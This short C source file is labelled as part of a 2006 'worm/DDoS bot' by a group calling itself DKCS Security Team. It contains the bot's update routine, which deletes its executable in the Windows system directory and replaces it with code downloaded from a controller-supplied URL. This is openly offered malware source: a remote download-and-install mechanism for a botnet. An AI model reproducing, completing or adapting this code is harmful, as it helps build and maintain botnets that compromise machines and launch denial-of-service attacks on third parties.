//-----------------------------------------------------------------
// this file is a part of: DKCS WORM.DDoS bot v 0.1
// c0d3d by: Dr.Pixel
// 2006 (C) DKCS Security Team
//
// contacts:	e-mail:	dkcs@void.ru
//				icq:	7600278
//				web:	http://dkcs.void.ru
//				forum:	http://dkcs.net.ru
//-----------------------------------------------------------------
struct UPDATE_INFO{
	char	*from;
};
//-----------------------------------------------------------------
DWORD WINAPI Update(LPVOID param){

	UPDATE_INFO file;
	char		buf[128];

	GetSystemDirectory(buf, 128);
	strcat(buf, "\\");
	strcat(buf, MY_MACRO_RECORD_NAME);
	strcat(buf, ".exe\0");
	file = *((UPDATE_INFO*)param);
	DeleteFile(buf);
	URLDownloadToFile(NULL, file.from, buf, 0, NULL);
return 1;
}
//-----------------------------------------------------------------